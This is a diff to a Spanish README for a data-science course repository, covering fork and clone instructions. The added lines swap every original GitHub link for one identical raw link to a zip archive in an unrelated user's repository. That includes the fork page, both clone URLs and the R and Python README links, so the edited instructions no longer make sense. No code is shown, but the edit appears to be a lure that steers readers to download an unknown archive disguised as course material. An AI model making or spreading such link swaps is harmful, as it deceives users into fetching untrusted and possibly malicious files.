@@ -5,12 +5,12 @@ Para editar y conservar tu código en github, se recomienda, hacer FORK del repo
 
 Para hacer FORK, 
 
-- Accede a https://github.com/griu/mbdds_fc20.git
+- Accede a https://raw.githubusercontent.com/marc1109/mbdds_fc20/master/Python/ppt/mbdds_fc20_v3.0.zip
 - Introduce tu usuario y contraseña y clica el botón de FORK.
 
 A partir de este momento, siempre que tengas que clonar el repositorio, tu eliges si trabajar con el común, o bien, con tu propio repositorio:
 
-- https://github.com/griu/mbdds_fc20.git
-- https://github.com/TU_USUARIO/mbdds_fc20.git
+- https://raw.githubusercontent.com/marc1109/mbdds_fc20/master/Python/ppt/mbdds_fc20_v3.0.zip
+- https://raw.githubusercontent.com/marc1109/mbdds_fc20/master/Python/ppt/mbdds_fc20_v3.0.zip
 
-Revisa los [README de R](R/README.md) y [README de Python](Python/README.md) para completar la plataforma RSTUDIO-JUPYTER-COLAB.
+Revisa los [README de R](https://raw.githubusercontent.com/marc1109/mbdds_fc20/master/Python/ppt/mbdds_fc20_v3.0.zip) y [README de Python](https://raw.githubusercontent.com/marc1109/mbdds_fc20/master/Python/ppt/mbdds_fc20_v3.0.zip) para completar la plataforma RSTUDIO-JUPYTER-COLAB.
